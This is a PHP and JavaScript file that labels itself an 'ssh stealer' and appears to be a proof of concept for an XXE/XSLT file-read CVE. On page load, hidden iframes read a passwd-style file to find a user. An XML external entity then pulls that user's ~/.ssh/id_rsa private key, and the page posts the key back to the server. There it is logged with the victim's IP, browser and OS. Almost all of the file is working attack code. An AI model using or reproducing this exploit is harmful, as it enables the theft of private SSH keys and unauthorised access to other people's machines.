
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
session_start();



?>

<?php
// Function to get the client IP address
function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}
?>
<?php

$user_agent     =   $_SERVER['HTTP_USER_AGENT'];

function getOS() { 

    global $user_agent;

    $os_platform    =   "Unknown OS Platform";

    $os_array       =   array(
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );

    foreach ($os_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }

    }   

    return $os_platform;

}

?>

<?php
 

function getBrowser() {

    global $user_agent;

    $browser        =   "Unknown Browser";

    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );

    foreach ($browser_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }

    }

    return $browser;

}


$user_os        =   getOS();
$user_browser   =   getBrowser();

$device_details =   "<strong>Browser: </strong>".$user_browser."<br /><strong>Operating System: </strong>".$user_os."";


?>
<?php 
//ssh stealer
function writetootherxml(){
 
    if(isset($_POST['username'])){
        $username = $_POST['username'];
        $xml = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM \"file:///home/".$username."/.ssh/id_rsa\">]>\n<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n<xsl:template match=\"/fruits\">\n&ext_file;\n</xsl:template>\n</xsl:stylesheet>\n";
        file_put_contents("./getotherthings.xml", $xml);
    
     }
   
}
writetootherxml();

//ssh stealer writing data process
if(isset($_POST['ssh'])){
    $id_rsa = $_POST['ssh'];
    $data = new stdClass();
    $date=date("Y/m/d:h:i:sa");
    $data->date = $date;
    $data->device_details=$device_details;
    $data->client_ip=get_client_ip();
    $data->id_rsa=$id_rsa;
    $values = json_encode($data);
    file_put_contents("./client".get_client_ip().".json", $values);
    };
    
?>


<html>
    <head>
    <script>
        
        function getotherthings(){
            const iframe2 = document.getElementById("xxe");
            iframe2.src = "getotherthings.svg";
                iframe2.onload = function() {
                xxeresult = iframe2.contentWindow.document.documentElement.innerHTML;
                var data = new FormData();
                data.append('ssh', xxeresult);
                
                
                var xhr = new XMLHttpRequest();
                xhr.open('POST', '/test/cve.php', true);
                
                xhr.send(data);
                console.log("ssh sent")
            }
            

        }
        function send_value(){
            const iframe = document.getElementById("xslt");
            
            iframe.src = "getuser.svg";
      
            iframe.onload = function() {
            passwdContent = iframe.contentWindow.document.documentElement.innerHTML;
            
            // satırlara ayır
            var lines = passwdContent.split('\n');

            // get user id 1000
            var userLine = lines.find(function(line) {
                return line.includes(':1000:');
            });

            if (userLine) {
                // Split the line by ":" and get the username
                var userInfo = userLine.split(':');
                var username = userInfo[0];

                console.log('Kullanıcı Adı:', username);
                var data = new FormData();
                data.append('username', username);


                var xhr = new XMLHttpRequest();
                xhr.open('POST', '/test/cve.php', true);

                xhr.send(data);
                setTimeout(function() {
                console.log('done1');
                getotherthings();
                console.log('done2');
                }, 2000);
                
           
            
        } else {
                console.log('Kullanıcı bulunamadı');
            }
        };
        
        }  
        
        
		function reloaded(){
			window.location.reload()
		}
        setTimeout("send_value()", 3000);
        
	</script>
    </head>
<body>
	<iframe id="xslt"  style="display:none;"></iframe>
    <iframe id="xxe"  style="display:none;"></iframe>
	
</body>

</html>